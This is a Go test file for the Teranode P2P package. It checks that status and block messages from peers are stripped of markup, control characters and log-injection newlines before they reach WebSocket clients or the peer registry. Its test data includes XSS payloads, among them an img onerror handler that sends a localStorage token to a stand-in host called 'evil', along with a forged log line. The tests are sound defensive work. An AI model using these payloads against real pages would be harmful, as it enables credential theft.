package p2p

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/bsv-blockchain/teranode/settings"
	"github.com/stretchr/testify/require"
)

func TestSanitizePeerDisplayString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty stays empty", "", ""},
		{"realistic client name survives", "client/1.0", "client/1.0"},
		{"realistic version survives", "v1.2.3-rc.1+build.7", "v1.2.3-rc.1+build.7"},
		{"realistic miner name survives", "TeraNode Miner 1", "TeraNode Miner 1"},
		{"strips markup characters", "<img src=x onerror=alert(1)>", "img src=x onerror=alert(1)"},
		{"strips quotes and backticks", `a"b'c` + "`d", "abcd"},
		{"strips ampersand and angle bracket, keeps the rest", "a&lt;b", "alt;b"},
		{"strips control characters", "a\x00b\x1bc", "abc"},
		{"strips newlines (log injection)", "ok\nlevel=fatal msg=pwned", "oklevel=fatal msg=pwned"},
		{"strips non-ascii", "teranode‮en", "teranodeen"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, sanitizePeerDisplayString(tt.input, maxPeerDisplayStringLen))
		})
	}
}

func TestSanitizePeerDisplayString_Truncates(t *testing.T) {
	got := sanitizePeerDisplayString(strings.Repeat("a", 10_000), maxPeerDisplayStringLen)
	require.Len(t, got, maxPeerDisplayStringLen)

	// Stripped characters must not consume budget, so a long hostile prefix
	// cannot push legitimate content out of the result.
	got = sanitizePeerDisplayString(strings.Repeat("<", 10_000)+"teranode", maxPeerDisplayStringLen)
	require.Equal(t, "teranode", got)
}

func TestSanitizePeerHexString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty stays empty", "", ""},
		{"lowercase hex survives", "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc", "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc"},
		{"uppercase hex survives", "DEADBEEF", "DEADBEEF"},
		{"0x prefix rejected", "0xdeadbeef", ""},
		{"markup rejected", "<script>", ""},
		{"partially hex rejected outright", "dead<beef", ""},
		{"over-length rejected", strings.Repeat("a", maxPeerHexStringLen+1), ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, sanitizePeerHexString(tt.input, maxPeerHexStringLen))
		})
	}
}

func TestSanitizePeerEnum(t *testing.T) {
	require.Equal(t, storageModeFull, sanitizePeerEnum("full", storageModeFull, storageModePruned))
	require.Equal(t, storageModePruned, sanitizePeerEnum("pruned", storageModeFull, storageModePruned))
	require.Empty(t, sanitizePeerEnum("<img src=x>", storageModeFull, storageModePruned))
	require.Empty(t, sanitizePeerEnum("Full", storageModeFull, storageModePruned), "enum match is exact")
	require.Empty(t, sanitizePeerEnum("", storageModeFull, storageModePruned))
}

// TestSanitizeNodeStatusMessage_PreservesHonestValues guards against the
// sanitizer being tightened to the point where a well-behaved node's own
// status would be mangled.
func TestSanitizeNodeStatusMessage_PreservesHonestValues(t *testing.T) {
	msg := &NodeStatusMessage{
		Version:           "v1.2.3",
		CommitHash:        "a1b2c3d4-dirty",
		ClientName:        "client/1.0",
		MinerName:         "TeraNode Miner 1",
		FSMState:          "RUNNING",
		SyncPeerID:        "16Uiu2HAmSyncPeer",
		ChainWork:         "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc",
		SyncPeerBlockHash: "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f",
		ListenMode:        settings.ListenModeListenOnly,
		Storage:           storageModeFull,
	}
	want := *msg

	sanitizeNodeStatusMessage(msg)

	require.Equal(t, want, *msg)
}

func TestSanitizeNodeStatusMessage_StripsHostileValues(t *testing.T) {
	const payload = `<img src=x onerror=fetch('//evil/'+localStorage.token)>`

	msg := &NodeStatusMessage{
		Version:           payload,
		CommitHash:        payload,
		ClientName:        payload,
		MinerName:         payload,
		FSMState:          payload,
		SyncPeerID:        payload,
		ChainWork:         payload,
		SyncPeerBlockHash: payload,
		ListenMode:        payload,
		Storage:           payload,
	}

	sanitizeNodeStatusMessage(msg)

	// Hex and enum fields are all-or-nothing.
	require.Empty(t, msg.ChainWork)
	require.Empty(t, msg.SyncPeerBlockHash)
	require.Empty(t, msg.ListenMode)
	require.Empty(t, msg.Storage)

	// Free-form fields keep their harmless characters but lose all markup.
	for _, got := range []string{msg.Version, msg.CommitHash, msg.ClientName, msg.MinerName, msg.FSMState, msg.SyncPeerID} {
		require.NotContains(t, got, "<")
		require.NotContains(t, got, ">")
		require.NotContains(t, got, "'")
		require.LessOrEqual(t, len(got), maxPeerDisplayStringLen)
	}
}

// TestHandleNodeStatusTopic_SanitizesPeerStrings is the end-to-end guard: a
// hostile gossip message must not reach WebSocket subscribers or the peer
// registry with its markup intact.
func TestHandleNodeStatusTopic_SanitizesPeerStrings(t *testing.T) {
	s, reg := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	const (
		blockHash = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"
		payload   = `<img src=x onerror=fetch('//evil/'+localStorage.token)>`
	)

	msgBytes, err := json.Marshal(NodeStatusMessage{
		PeerID:        remote.String(),
		BestHeight:    101,
		BestBlockHash: blockHash,
		Version:       payload,
		CommitHash:    payload,
		ClientName:    payload,
		MinerName:     payload,
		FSMState:      payload,
		ListenMode:    payload,
		ChainWork:     payload,
		Storage:       payload,
	})
	require.NoError(t, err)

	s.handleNodeStatusTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		for name, got := range map[string]string{
			"version":     notification.Version,
			"commit_hash": notification.CommitHash,
			"client_name": notification.ClientName,
			"miner_name":  notification.MinerName,
			"fsm_state":   notification.FSMState,
		} {
			require.NotContains(t, got, "<", "%s reached WebSocket clients with markup", name)
			require.NotContains(t, got, ">", "%s reached WebSocket clients with markup", name)
		}

		require.Empty(t, notification.ChainWork, "non-hex chain_work must be dropped")
		require.Empty(t, notification.ListenMode, "unknown listen_mode must be dropped")
		require.Empty(t, notification.Storage, "unknown storage mode must be dropped")
	default:
		t.Fatal("expected node_status notification")
	}

	got, ok := reg.Get(remote.String())
	require.True(t, ok)
	require.NotContains(t, got.ClientName, "<", "hostile client name was stored in the peer registry")

	// An unrecognised storage mode must not be recorded at all.
	require.NotEqual(t, payload, got.Storage)
}

// TestHandleBlockTopic_SanitizesClientName covers the same relay path for the
// block topic, which forwards ClientName the same way.
func TestHandleBlockTopic_SanitizesClientName(t *testing.T) {
	s, reg := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	const blockHash = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"

	msgBytes, err := json.Marshal(BlockMessage{
		PeerID:     remote.String(),
		Hash:       blockHash,
		Height:     101,
		DataHubURL: "http://peer.example",
		ClientName: `<img src=x onerror=alert(1)>`,
	})
	require.NoError(t, err)

	s.handleBlockTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		require.NotContains(t, notification.ClientName, "<")
		require.NotContains(t, notification.ClientName, ">")
	default:
		t.Fatal("expected block notification")
	}

	got, ok := reg.Get(remote.String())
	require.True(t, ok)
	require.NotContains(t, got.ClientName, "<", "hostile client name was stored in the peer registry")
}
